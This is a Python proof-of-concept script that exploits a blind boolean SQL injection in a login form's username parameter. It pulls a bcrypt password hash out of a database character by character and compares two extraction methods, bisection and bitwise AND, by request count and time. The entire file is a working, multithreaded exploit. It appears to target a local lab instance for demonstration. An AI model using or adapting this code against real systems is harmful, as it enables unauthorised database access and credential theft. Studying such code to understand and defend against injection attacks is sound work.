#!/usr/bin/python3

# William Moody (@bmdyy)
# 30.11.2022

import requests
import sys
import time
from multiprocessing import Pool
from urllib.parse import quote_plus

if len(sys.argv) != 2:
    print("usage: %s N_THREADS" % sys.argv[0])
    exit(1)

PWD_LENGTH = 60 # Assumed knowledge
N_THREADS = int(sys.argv[1]) # Size of thread pool for Bisection / SQL-Anding

# Colors
C_RESET = "\x1b[0m"
C_BOLD = "\x1b[1m"
C_BLUE = "\x1b[38;5;32m"
C_GREEN = "\x1b[38;5;34m"
C_YELLOW = "\x1b[38;5;3m"

def oracle(q):
    r = requests.post(
        "http://0.0.0.0/index.php",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data="username=" + quote_plus("bmdyy' AND (" + q + ")-- -")
    )
    return "Email was sent!" in r.text

# Verify the oracle works
assert oracle("1=1")
assert not oracle("1=2")
print("%s%s[+]%s Oracle verified" % (C_BOLD, C_GREEN, C_RESET))

def bisection():
    with Pool(N_THREADS) as p:
        res = p.map(bisection_thread, range(1, PWD_LENGTH + 1))

    password = ''.join(res)
    sys.stdout.write(password)
    return password, PWD_LENGTH * 7

# Dumps the char at index 'i'
# Sends 7 requests
def bisection_thread(i):
    low = 0
    high = 127

    while low <= high:
        mid = (low + high) // 2
        if oracle("ASCII(MID(password, %d, 1)) BETWEEN %d AND %d" % (i, low, mid)):
            high = mid - 1
        else:
            low = mid + 1

    return chr(low)

def sqlAnding():
    jobs = []
    for i in range(1, PWD_LENGTH + 1): # Indices
        for j in [1, 2, 4, 8, 16, 32, 64]: # Powers of two
            jobs.append((i,j))

    with Pool(N_THREADS) as p:
        res = p.starmap(sqlAnding_thread, jobs)

    password = ""
    for i in range(0, len(res), 7):
        password += chr(sum(res[i:i+7]))

    sys.stdout.write(password)
    return password, len(jobs)

def sqlAnding_thread(index, val):
    return val if oracle("ASCII(MID(password,%d,1)) & %d" % (index, val)) else 0

# Demonstrate the two algorithms
for i in range(2):
    num_requests = 0

    if i == 0:
        print("\n%s--- BISECTION ---\n%s[+]%s " % (C_BOLD, C_GREEN, C_RESET), end='')
        start = time.time()
        password, num_requests = bisection()

    else:
        print("\n%s--- SQL-ANDING ---\n%s[+]%s " % (C_BOLD, C_GREEN, C_RESET), end='')
        start = time.time()
        password, num_requests = sqlAnding()

    elapsed = time.time() - start

    # Verify the password was dumped correctly
    assert password == "$2a$12$HEXnjRPQxxSLVrdUSf7d6.uHn2LZt4vyZ2CN66L/qI177ovoHea66"

    print("\n\n%s%s[*]%s Total number of requests: %s%d%s" % (C_BOLD, C_BLUE, C_RESET, C_YELLOW, num_requests, C_RESET))
    print("%s%s[*]%s Average requests per char: %s%.3f%s" % (C_BOLD, C_BLUE, C_RESET, C_YELLOW, num_requests / PWD_LENGTH, C_RESET))
    print("%s%s[*]%s Time elapsed: %s%f%s seconds" % (C_BOLD, C_BLUE, C_RESET, C_YELLOW, elapsed, C_RESET))